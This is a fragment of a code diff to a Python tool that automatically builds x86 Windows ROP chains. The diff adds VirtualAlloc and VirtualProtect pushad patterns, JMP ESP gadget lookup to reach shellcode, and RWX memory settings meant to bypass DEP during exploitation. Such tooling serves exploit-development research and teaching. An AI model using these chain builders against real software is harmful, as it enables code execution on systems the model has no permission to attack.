 			foundESPFinal, pkEnd =findChangeESP(reg,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement,distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,"winApi",sysTarget,PWinApi)
 			if not foundESPFinal:
@@ -9144,7 +9547,6 @@ def buildMovDeref(excludeRegs,bad, myArgs ,numArgs):
 			pk2=pkBuild([pkStart,pkFlOld,pkFn,pkDW,pkLP,pkRA,pkEnd]) #pkFn,pkDW
 			dp ("\n\nreal final chain")
 			distParam, apiReached=getDistanceParamReg(pe,n,pk2,distEsp,IncDec,numP,"winApi", "esp", destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
-
 			showChain(pk2)
 			cOut,out=genOutput(pk2)
 			print(cOut)
@@ -9201,6 +9603,7 @@ class getParamVals:
 		self.info=1
 	def get(self, name: str,excludeRegs,r,r2,bad,pk):#, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2=False):
 		dp ("get", name)
+		# print ("get",name)
 		if 1==1:
 			do = f"get_{name}"
 
@@ -9343,6 +9746,55 @@ class getParamVals:
 			return True, j1,comment
 		# print ("jmpDword not found")
 		return False,0xffffadd,"JMP DWORD NOT FOUND"
+
+	def get_JmpESP(self,name,excludeRegs,r,r2,bad,pk):
+		foundJ, j1 = findGenericC2AgnosticJmpCall("jmp","esp",bad,True, [],0)
+		comment=""
+		if foundJ:	
+			try:
+				tryThis=tryThisFunc(j1)
+
+				# tryThis= " -> " + disOffset(j1)
+				dp (tryThis)
+			except Exception as e:
+				tryThis=hex(j1)
+			comment= hx(img(j1)) +  tryThis
+		if foundJ:
+			# j1=img(j1)
+			return True, j1,comment
+		# print ("jmpDword not found")
+		return False,0xffffadd,"JMP ESP NOT FOUND"
+
+	def get_nop(self,name,excludeRegs,r,r2,bad,pk):
+		comment="Build some NOPs"
+		return True, 0x90909090,comment
+		
+	def get_VAPtr(self,name,excludeRegs,r,r2,bad,pk):
+		dp ("get VPPtr")
+		l=0x30000
+		comment="VirtualAlloc pointer"
+		try:
+			l=dllDict["kernel32.dll"]["VirtualAlloc"]
+		except:
+			try:
+				l=dllDict["kernelbase.dll"]["VirtualAlloc"]
+			except:
+				dp ("Ptr to VirtualAlloc not found.")
+				comment="Ptr to VirtualAlloc not found. 0x30000 used as placeholder."
+
+		foundLL=True
+		if foundLL:
+			return True, l,comment
+		else:
+			True,0x30304,"Simulated value-VirtualAlloc ptr not found!"
+		return False,0,"VirtualAlloc Ptr not Found"
+
+
+	def get_VAPtr2(self,name,excludeRegs,r,r2,bad,pk):
+		dp ("get get_VAPtr2")
+		bVal,p, com=self.get_VAPtr(name,excludeRegs,r,r2,bad,pk)
+		return bVal,p,com
+
 	def get_VPPtr(self,name,excludeRegs,r,r2,bad,pk):
 		dp ("get VPPtr")
 		l=0x30000
@@ -9360,19 +9812,62 @@ class getParamVals:
 		if foundLL:
 			return True, l,comment
 		else:
-			True,0x30000,"Simulated value-VirtualProtect ptr not found!"
+			True,0x30306,"Simulated value-VirtualProtect ptr not found!"
 		return False,0,"VirtualProtect Ptr not Found"
+
+	def get_VPPtr2(self,name,excludeRegs,r,r2,bad,pk):
+		dp ("get VPPtr2")
+		bVal,p, com=self.get_VPPtr(name,excludeRegs,r,r2,bad,pk)
+		return bVal,p,com
+
 	def get_dwSize(self,name,excludeRegs,r,r2,bad,pk):
 		comment=""
-		return True, 0x209,comment
-		
+		return True, 0x409,comment
+	
+	def get_dwSize2(self,name,excludeRegs,r,r2,bad,pk):
+		comment=" - dwSize"
+		return True, 0x01,comment
+
+
+	def get_flAllocationType(self,name,excludeRegs,r,r2,bad,pk):
+		comment=" flAllocationType (MEM_COMMIT)"
+		return True, 0x1000,comment
+
 	def get_flNewProtect(self,name,excludeRegs,r,r2,bad,pk):
 		comment=" - RWX"
 		return True, 0x40,comment
 
-	def get_flOldProtect(self,name,excludeRegs,r,r2,bad,pk):
-		comment=""
-		return True, 0xbaddcad2,comment
+	def get_flOldProtect(self,name,excludeRegs,reg,r2,bad,pk):
+		# print ("get_flOldProtect", reg, r2, excludeRegs)
+		comment="Can be any writable memory"
+		availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
+		espDesiredMovement=0
+		for reg1 in excludeRegs:
+			availableRegs.remove(reg1)
+		length1=True
+
+		comment="Can be any writable memory"
+		foundStart, chSP=findStackPivot(reg,bad,length1, excludeRegs,availableRegs,comment)
+		if foundStart:
+			# showChain(chSP,True)
+			return True, chSP,comment
+
+		for r in availableRegs:
+			foundStart, chSP2=findStackPivot(r,bad,length1, excludeRegs,availableRegs,comment)
+			if foundStart:
+				excludeRegs2= copy.deepcopy(excludeRegs)
+				excludeRegs2.append(r)
+				foundT, gT = findUniTransfer(reg,r, bad,length1,excludeRegs2,espDesiredMovement, "Transfer " +r +" to " + reg,True, True,True)
+				if foundT:
+					pk=pkBuild([chSP2, gT])
+					# showChain(pk,True)
+					return True, pk,comment
+
+		foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs,0xbaddcad2,comment)
+		if foundP1:
+			return True, chP,comment
+		else:
+			return False, 0,0
 
 	def get_jmp(self,name,excludeRegs,r,r2,bad,pk):
 		foundJ, j1=findJmp(r2,bad)
@@ -9851,12 +10346,46 @@ pat = {  'LoLi1':{
 		
 		'3': {'r': 'esi', 'val': 'JmpDword', 'excluded':[], "r2":"eax",'com':''},
 
-		'4': {'r': 'ebp', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebp', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
+		'2': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':'LpAddress - automatic - skip'},
+		'7': {'r': 'ebx', 'val': 'dwSize', 'excluded':[], "r2":"",'com':'dwSize'},
+		'5': {'r': 'edx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':'flNewProtect - 0x40'},
+		'4': {'r': 'ecx', 'val': 'flOldProtect', 'excluded':[], "r2":"",'com':'flOldProtect - any writable memory address!'}
+        },
+        'VP2':{ 
+		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'esi','com':''},
+		'8': {'r': 'eax', 'val': 'nop', 'excluded':[],"r2":"",'com':''},
+		
+		'3': {'r': 'esi', 'val': 'VPPtr2', 'excluded':[], "r2":"eax",'com':''},
+
+		'4': {'r': 'ebp', 'val': 'JmpESP', 'excluded':[], "r2":"",'com':''},
 		'2': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':'LpAddress - automatic - skip'},
 		'7': {'r': 'ebx', 'val': 'dwSize', 'excluded':[], "r2":"",'com':'dwSize'},
 		'5': {'r': 'edx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':'flNewProtect - 0x40'},
 		'6': {'r': 'ecx', 'val': 'flOldProtect', 'excluded':[], "r2":"",'com':'flOldProtect - any writable memory address!'}
         },
+
+        'VA1':{ 
+		'8': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':''},
+		'2': {'r': 'eax', 'val': 'nop', 'excluded':[],"r2":"",'com':''},
+		'3': {'r': 'esi', 'val': 'VAPtr2', 'excluded':[], "r2":"",'com':''},
+		'4': {'r': 'ebp', 'val': 'JmpESP', 'excluded':[], "r2":"",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':' LpAddress - automatic skip '},
+		'6': {'r': 'ebx', 'val': 'dwSize2', 'excluded':[], "r2":"",'com':''},
+		'7': {'r': 'edx', 'val': 'flAllocationType', 'excluded':[], "r2":"",'com':''},
+		'1': {'r': 'ecx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':' flNewProtect '}
+		},
+        
+        'VA2':{ 
+		'8': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':''},
+		'2': {'r': 'eax', 'val': 'VAPtr', 'excluded':[],"r2":"",'com':''},
+		'3': {'r': 'esi', 'val': 'JmpDword', 'excluded':[], "r2":"eax",'com':''},
+		'4': {'r': 'ebp', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':' LpAddress - automatic skip '},
+		'6': {'r': 'ebx', 'val': 'dwSize2', 'excluded':[], "r2":"",'com':''},
+		'7': {'r': 'edx', 'val': 'flAllocationType', 'excluded':[], "r2":"",'com':''},
+		'1': {'r': 'ecx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':' flNewProtect '}
+		},
 		'SYSxx':{ 
 		'1': {'r': 'edi', 'val': 'x', 'excluded':[], "r2":'','com':''},
 		'2': {'r': 'eax', 'val': 'x', 'excluded':[],"r2":"",'com':''},
@@ -9884,7 +10413,7 @@ def addExRegs(excludeRegs, r):
 	return excludeRegs
 
 
-def buildPushadInner(bad,excludeRegs2,winApi,apiNum,apiCode,pk1, completePKs,stopCode):
+def buildPushadInner(bad,excludeRegs,winApi,apiNum,apiCode,pk1, completePKs,stopCode):
 	j=0
 	outputsTxt=[]
 	outputsPk=[]
@@ -9894,6 +10423,8 @@ def buildPushadInner(bad,excludeRegs2,winApi,apiNum,apiCode,pk1, completePKs,sto
 		i,j, apiCode, apiNum= giveApiNum(winApi,j)
 		# print (gre+"i", i, "j", j, "apiCode",apiCode,"apiNum",apiNum,res)
 		# apiCode="GPA1s"
+		# print (i, j, "apiCode",apiCode, apiNum)
+
 		excludeRegs2= copy.deepcopy(excludeRegs)
 		# i=apiCode+str(j)
 		# curPat=i
@@ -9971,11 +10502,11 @@ def buildPushadInner(bad,excludeRegs2,winApi,apiNum,apiCode,pk1, completePKs,sto
 
 		fRet, pR,rDict=findRet(bad)
 		foundPushad, puA,pDict=findPushad(bad,length1,excludeRegs)
+		
+
+
 		if foundPushad:
 			pkPA=pkBuild([pk,puA])
-			# print (gre)
-			# showChain(pkPA,True)
-			# print(res)
 		else:
 			cOut,out= (genOutput(pk,winApi))
 			print (cOut)
@@ -9995,8 +10526,21 @@ def buildPushadInner(bad,excludeRegs2,winApi,apiNum,apiCode,pk1, completePKs,sto
 			# 	success, tryPackage = tryObfMethods(excludeRegs,bad,img(puA),"", bb, False,reg,comment)
 
 		if foundL1 and foundL2 and foundL3 and foundL4 and foundL5 and foundL6 and foundL7 and foundL8 and foundPushad:
-			pkFinal=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8, pR])
-			pkFinalPA=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8,puA])
+			if i!="VP1" and i!="VA2":
+				pkFinal=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8, pR])
+				pkFinalPA=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8,puA])
+				# showChain(pkFinal,True)
+			else:
+				jFound22, jESP,com2=pv.get_JmpESP("JmpESP",excludeRegs, esp,"", bad,[])
+				if jFound22:
+					chJ=chainObj(jESP, "Jmp to shellcode",[])
+				else:
+					fRet, rn,rDict=findRet(bad)
+					chJ=chainObj(rn, "JMP ESP needed here to reach shellcode",[])
+
+				pkFinal=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8, pR,chJ])
+				pkFinalPA=pkBuild([lr1,lr2,lr3,lr4,lr5,lr6,lr7,lr8,puA,chJ])
+
 
 			pass
 			if not stopCode in apiCode:
@@ -10042,15 +10586,21 @@ def giveApiNum(winApi,j):
 		apiNum=11
 		apiCode="HG32"
 	elif winApi=="VP":
-		apiNum=1
-		apiCode="VP"			
+		apiNum=2
+		apiCode="VP"
+	elif winApi=="VA":
+		apiNum=2
+		apiCode="VA"						
 	i=apiCode+str(j)
 	curPat=i
 	return i,j, apiCode, apiNum
 
-def buildPushad(excludeRegs,bad, patType):
+def buildPushad(bad, patType):
+	excludeRegs=[]
 	global opt
 	bad=opt["badBytes"]
+	print ("checking", opt["acceptASLR"])
+
 	global curPat
 	global oldPat
 	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
@@ -10099,11 +10649,18 @@ def buildPushad(excludeRegs,bad, patType):
 			printGadgetChain(outputsTxtHG, "Heavens_Gate_32_to_64")
 	elif patType=="VP":
 		stopCode="VP"
-		foundInnerVP,outputsTxtVP, outputsTxtCVP,outputsPkVP=buildPushadInner(bad,excludeRegs2,"VP",1,"apiCode",pk,pk,stopCode)
+		foundInnerVP,outputsTxtVP, outputsTxtCVP,outputsPkVP=buildPushadInner(bad,excludeRegs2,"VP",2,"apiCode",pk,pk,stopCode)
 		if foundInnerVP:
 			# fgc.addHg32to64(fChainObj(outputsPkHG,outputsTxtHG,outputsTxtCHG))
 			#todo
 			printGadgetChain(outputsTxtVP, "VirtualProtect")
+	elif patType=="VA":
+		stopCode="VA"
+		foundInnerVP,outputsTxtVP, outputsTxtCVP,outputsPkVP=buildPushadInner(bad,excludeRegs2,"VA",2,"apiCode",pk,pk,stopCode)
+		if foundInnerVP:
+			# fgc.addHg32to64(fChainObj(outputsPkHG,outputsTxtHG,outputsTxtCHG))
+			#todo
+			printGadgetChain(outputsTxtVP, "VirtualAlloc")
 
 
 def buildPushadOld(excludeRegs,bad, myArgs ,numArgs):
@@ -10216,17 +10773,30 @@ def buildPushadOld(excludeRegs,bad, myArgs ,numArgs):
 	for o in outputs:
 		dp (o)
 def getDistanceParamReg(pe,n,pk, distEsp, IncDec,numP,targetP,targetR, destAfter,PWinApi=0,sysTarget=None, rValStr=None,distanceMode=False,patType=None):
+	# print(PWinApi,sysTarget, rValStr,distanceMode,patType)
 	global finalPivotGadget
 
-	dp (cya)
-	dp ("getDistanceParamReg targetP",targetP, "numP", numP,"patType" ,patType)
+	dp (cya,"getDistanceParamReg targetP",targetP, "numP", numP,"patType" ,patType,res)
 	if not distanceMode:
 		myGadgets=buildRopChainTemp(pk)
 	else:
 		myGadgets=buildRopChainTempMore(pk,rValStr,patType)
 
-    
+	try:
+		if sysTarget!=None:
+			sysTarget=img(sysTarget)
+		else:
+			# print(hex(fg.rop[finalPivotGadget].offset), hex(pe[n].startLoc),n)
+			finalPivotGadget=img(finalPivotGadget)
+			# print ("finalPivotGadget", hex(finalPivotGadget))
+	except Exception as e:
+		dp ("oh no", sysTarget)
+		dp(e)
+		dp(traceback.format_exc())
+
 	gOutput, locParam, locReg, winApiSyscallReached, givStDistance =rop_testerRunROP(pe,n,myGadgets,distEsp, IncDec,numP,targetP,targetR,PWinApi,sysTarget,finalPivotGadget, rValStr)
+	pkTxt=showChain(pk,False,True)
+	outFile.write("The above pertains to the below:\n  " +pkTxt+"\n\n")
 	
 	dp ("destAfter",destAfter)
 	if destAfter:   # Target Param AFTER current memory location (e.g. mov dword [ebx], eax    -->  target destination AFTER ebx)
@@ -10236,6 +10806,7 @@ def getDistanceParamReg(pe,n,pk, distEsp, IncDec,numP,targetP,targetR, destAfter
 		diffPR=locReg-locParam
 
 		#to do???????
+
 	dp(yel)
 	dp ("diffPR 1", hex(diffPR))
 	
@@ -10253,7 +10824,7 @@ def getDistanceParamReg(pe,n,pk, distEsp, IncDec,numP,targetP,targetR, destAfter
 	dp ("givStDistance",  hex(givStDistance), hex(intGivStDistance ))
 	if intGivStDistance!=0xdeadc0de:
 		diffPR=intGivStDistance
-		dp (gre, "switch made",res)
+		dp (gre, "switch made",res, hex(diffPR))
 	return diffPR, winApiSyscallReached
 
 
@@ -10556,7 +11127,7 @@ def buildHGDouble(hgExcludeRegs,excludeRegs):
 					break ## we have them - can stop
 
 					# need a pop analyzer for diff=0
-	#now searching for ones that are slightly imperfect - some clobbering
+	# searching for ones that are slightly imperfect - some clobbering
 
 	# otherRegsToExclude=[]
 
@@ -10940,7 +11511,7 @@ def buildNegTarget(desired,excludeRegs, bad, withPR=True, firstReg=False):
 		else:
 			foundPu1=True
 		if negFound and foundP1 and foundPu1:
-			print ("found them")
+			# print ("found them")
 			tryThis=tryThisFunc(desired)
 			rp1=chainObj(p1, "loading value for neg", [preNeg])
 			rp2=chainObj(f1, hex(preNeg) + " -> " + hex(desired) + tryThis, [])
@@ -10976,7 +11547,7 @@ def buildNeg2(desired,excludeRegs, bad, withPR=True, firstReg=False):
 			else:
 				foundPu1=True
 			if negFound and foundP1 and foundPu1:
-				print ("found them")
+				# print ("found them")
 				tryThis=tryThisFunc(desired)
 				rp1=chainObj(p1, "loading value for neg", [preNeg])
 				rp2=chainObj(f1, hex(preNeg) + " -> " + hex(desired) + tryThis, [])
@@ -11287,10 +11858,10 @@ def buildFoundIntOvTarget(desired,excludeRegs,bad, withPR=True, regFirst=None, c
 	intFound, overflow,f1 = foundIntOverflows(myDict,desired,bad)
 	foundP1, p1, popD1 = findPop(regFirst,bad,True,excludeRegs)
 	if not intFound:
-		# print ("intFound exit")
+		# print ("intFound ")
 		return False,0
 	if not foundP1:
-		# print ("foundP1 exit")
+		# print ("foundP1 ")
 		return False,0
 	if withPR:
 		foundPu1, pu1, pushD1 = findPush(regFirst,bad,True,excludeRegs,-4)
@@ -12502,7 +13073,7 @@ def findGadget():
 							break
 					q+=1
 				
-				# print ("exited loop")
+				# print ("left loop")
 				if sIsGood and q == len(myDis):
 					foundWilds[p]=fg.rop[p]
 					# print ("q", q,len(myDis))
@@ -12593,44 +13164,43 @@ def genHeavanGatex32():
 	# excludeRegs=[]
 	# bad=[]
 	# global bad
-	global excludeRegs
-	buildPushad(excludeRegs,[], "HG32" )
+	buildPushad([], "HG32" )
 def genHeavanGatex64():
 	buildHG([],[])
 def genWinSyscallNtAllocateVirtualMemory():
 	global bad
-	global excludeRegs
 	sysNtAllocParams=["tbd","tbd",0xFFFFFFFF,"ptr",0,"ptr",0x3000,0x40,0x6000]
 	print (cya+"   This will attempt to generate a ROP chain using the Windows syscall\n   NtAllocateVirtualMemory for "+yel+"Windows 10/11"+cya+". Other OSs not presently supported.\n"+res)
 	buildMovDerefSyscall([],bad, sysNtAllocParams,8 )
 
 def genWinSyscallNtProtectVirtualMemory():
 	global bad
-	global excludeRegs
+	global excludeRegsGlobal
 	sysNtProtectParms=["tbd", "tbd", 0xffffffff,"ptr", 1, 0x40, "ptr"]
 	print (cya+"   This will attempt to generate a ROP chain using the Windows syscall\n   NtProtectVirtualMemory for "+yel+"Windows 10/11"+cya+". Other OSs not presently supported.\n"+res)
 	buildMovDerefSyscallProtect([],bad, sysNtProtectParms,6 )
 
 def genShellcodelessROP_System():
 	global bad
-	global excludeRegs
-	buildPushad(excludeRegs,bad, "System" )
+	buildPushad(bad, "System" )
 
 def genVirtualProtectPushad():
 	global bad
-	global excludeRegs
-	buildPushad(excludeRegs,bad, "VP" )
+	buildPushad(bad, "VP" )
+
+
+def genVirtualAllocPushad():
+	global bad
+	buildPushad(bad, "VA" )
 
 def genMovDerefVP():
 	global bad
-	global excludeRegs
 	vpParams=[0x7877badd, "automatic","automatic",0x0299,0x40,0xbaddcad2]
-	buildMovDeref(excludeRegs,bad, vpParams,6 )
+	buildMovDeref(bad, vpParams,6 )
 
 def genShellcodelessROP_GetProc():
 	global bad
-	global excludeRegs
-	buildPushad(excludeRegs,bad, "GetProcAddress" )
+	buildPushad(bad, "GetProcAddress" )
 
 	pass
 def clearGadgets():
@@ -12742,8 +13312,8 @@ def getGadgets():
 	except:	
 		pass
 	
-	filename2=filenameRaw+"_pi.obj"
-	# filename3=getBaseDir()+"objfiles"+"\\"+"_pi.obj"
+	filename2=filenameRaw+"_gadgets.obj"
+	# filename3=getBaseDir()+"objfiles"+"\\"+"_gadgets.obj"
 
 	file_pi = open(filename2, 'wb') 
 	pickle.dump(fg, file_pi)
@@ -12767,7 +13337,7 @@ def getGadgetsx6486():
 	fg.x64=True
 	opt["bx64Extracted"]=True
 	opt["bx86Extracted"]=True
-	filename=filenameRaw+"_pi.obj"
+	filename=filenameRaw+"_gadgets.obj"
 	file_pi = open(filename, 'wb') 
 	pickle.dump(fg, file_pi)
 	dp ("done pickle getGadgets!")
@@ -12796,7 +13366,7 @@ def getGadgetsx64():
 	except:	
 		pass
 		
-	filename=filenameRaw+"_pi.obj"
+	filename=filenameRaw+"_gadgets.obj"
 	file_pi = open(filename, 'wb') 
 	pickle.dump(fg, file_pi)
 	dp ("done pickle getGadgets!")
@@ -14022,6 +14592,9 @@ def ui():
 			elif userIN[0:1] == "!":
 
 				genVirtualProtectPushad()
+			elif userIN[0:1] == "@":
+
+				genVirtualAllocPushad()
 			elif userIN[0:1] == "b":
 				getBadBytesSubmenu()
 			elif userIN[0:1] == "d":
@@ -14070,7 +14643,6 @@ def ui():
 
 
 if __name__ == "__main__":
-	excludeRegs=[]
 	rop=doGadgets()
 	fgc=gadgetChains()  #final gadget chains
 
@@ -14079,19 +14651,21 @@ if __name__ == "__main__":
 
 	dp (filenameRaw)
 	directory=""
-	fName=filenameRaw+"_pi.obj"
+	fName=filenameRaw+"_gadgets.obj"
 
 	useSaved=False
 
 	newpath = os.path.abspath(os.path.join(directory, fName))
 	if os.path.exists(newpath):
-		dp ("file exists")
+		# print ("file exists")
 		useSaved=True
+	# else:
+	# 	print("file not found", newpath, fName)
 	# useSaved=False
 
 
-	filename=filenameRaw+"_pi.obj"
-	filenamePE=filenameRaw+"_PEs.obj"
+	filename=filenameRaw+"_gadgets.obj"
+	filenamePE=filenameRaw+"_PE.obj"
 	filenameDLL=filenameRaw+"_DllDict.obj"
 
 			
@@ -14115,13 +14689,11 @@ if __name__ == "__main__":
 				pe = pickle.load(filehandlerPE)
 				filehandler = open(filename, 'rb') 
 				fg = pickle.load(filehandler)
-
 				file_dllDict = open(filenameDLL, 'rb') 
 				dllDict = pickle.load(file_dllDict)
-
 				loadP=True
 			except:
-				print ("Error loading previously saved - extraction restarting.")
+				print (mag,"Error loading previously saved - extraction restarting.",res)
 				Extraction()
 				useSaved=False
 				# print ("set false")
@@ -14159,7 +14731,7 @@ if __name__ == "__main__":
 			evaluateDll(skipSystemDlls, skipAllDlls, skipNonExtractedDlls)   # skipSystem, skipAll, skipNonextracted
 			# printPEValuesDict()
 			# input()
-			filenamePE=filenameRaw+"_PEs.obj"
+			filenamePE=filenameRaw+"_PE.obj"
 			file_pe = open(filenamePE, 'wb') 
 			pickle.dump(pe, file_pe)
 			filenameDLL=filenameRaw+"_DllDict.obj"
@@ -14169,6 +14741,7 @@ if __name__ == "__main__":
 
 
 		genBasesForEm()
+
 
 		n =peName
 
@@ -14181,7 +14754,7 @@ if __name__ == "__main__":
 				startGet_Op_Ret_Parallel()
 				# stop2 = timeit.default_timer()
 				# dp("Time 3: " + str(stop2 - start2))				
-			filename=filenameRaw+"_pi.obj"
+			filename=filenameRaw+"_gadgets.obj"
 			file_pi = open(filename, 'wb') 
 			pickle.dump(fg, file_pi)
 		else:
@@ -14197,7 +14770,6 @@ if __name__ == "__main__":
 			# dp("Time P: " + str(stop - start3))
 
 		# rop_testerRunROP(pe,n)
-		# exit()
 		t=0
 
 		# bad=b'\x0d\x0a'
@@ -14208,6 +14780,8 @@ if __name__ == "__main__":
 		bb=badBytes(bad)
 		bb.show()
 		readConf()
+		# genBasesForEmNew()
+
 		ui()
 
 		popExcludeRegs=[""]
@@ -14247,26 +14821,14 @@ if __name__ == "__main__":
 		# vpParams=[0x7877badd, "automatic","automatic",0x0299,0x40,0xbaddcad2]
 
 		# buildMovDeref(excludeRegs,bad, vpParams,6 )
-		# exit()
-		
-
 		# buildHG([],[])
-		
 
 		bad=b''
 		# patType="System"
-		# buildPushad(excludeRegs,bad, "System" )
-		# buildPushad(excludeRegs,bad, "GetProcAddress" )
-		# buildPushad(excludeRegs,bad, "HG32" )
-		# exit()
 		sysNtAllocParams=["tbd","tbd",0xFFFFFFFF,"ptr",0,"ptr",0x3000,0x40,0x6000]
 		# buildMovDerefSyscall([],bad, sysNtAllocParams,8 )
-
 		sysNtProtectParms=["tbd", "tbd", 0xffffffff,"ptr", 1, 0x40, "ptr"]
 		# buildMovDerefSyscallProtect([],bad, sysNtProtectParms,6 )
-		dp ("the end!")
-		# exit()
-
 		if not loadP:
 			file_pi = open(filename, 'wb') 
 			pickle.dump(fg, file_pi)
